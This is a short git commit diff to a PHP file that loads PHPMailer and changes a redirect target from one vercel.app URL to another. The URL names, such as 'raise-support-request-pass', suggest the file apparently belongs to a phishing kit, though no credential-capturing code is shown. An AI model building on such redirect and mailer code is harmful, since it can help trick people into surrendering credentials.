499c5edac016e9565c3dac7a63b5f6ca8cc8d385
asif1012-lgtm <hpboost8@gmail.com>
2025-07-22 15:20:33 +0500

    Update rajab1.php

--- rajab1.php
+++ rajab1.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://raise-support-request-pass.vercel.app/");
+header("Location:https://rajab1pass.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
